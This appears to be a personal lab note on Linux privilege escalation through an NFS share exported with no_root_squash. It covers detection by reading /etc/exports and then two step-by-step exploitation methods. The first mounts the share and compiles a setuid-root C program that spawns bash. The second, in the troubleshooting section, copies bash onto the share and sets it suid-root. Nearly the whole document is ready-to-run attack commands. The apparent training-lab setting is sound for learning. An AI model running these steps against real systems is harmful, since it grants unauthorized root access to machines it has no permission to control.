#Linux #PrivEsc #NFS #NFSRootSquashing

## **Detection**
Linux VM

1. In command line type: `cat /etc/exports`
2. From the output, notice that “`no_root_squash`” option is defined for the “`/tmp`” export.

## **Exploitation**
Attacker VM

1. Open command prompt and type: `showmount -e MACHINE_IP`
2. In command prompt type: `mkdir /tmp/1`
3. In command prompt type: `mount -o rw,vers=2 MACHINE_IP:/tmp /tmp/1`
4. In command prompt type:
```
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
```
5. In command prompt type: `gcc /tmp/1/x.c -o /tmp/1/x`
6. In command prompt type: `chmod +s /tmp/1/x
`
Linux VM

1. In command prompt type: `/tmp/x`
2. In command prompt type: `id`

--- 
# **Troubleshooting**

Another way to solve the #NFS exploit (if step 3 does not mount with `vers=2`) without #gcc is this:

On Attacker machine:
1. Open command prompt and type: `showmount -e MACHINE_IP`
2. In command prompt type: `mkdir /tmp/1`
3. In command prompt type: `mount -o rw,vers=3 MACHINE_IP:/tmp /tmp/1`

On Target machine:
4. In command prompt type: `cp /bin/bash /tmp/1`

On Attacker machine:
5. In command prompt type: `sudo chown root:root /tmp/1/bash`
6. In command prompt type : `sudo chmod +sx /tmp/1/bash`

On Target machine:
7. In command prompt type: `/tmp/1/bash -p`
8. In command prompt type: `id`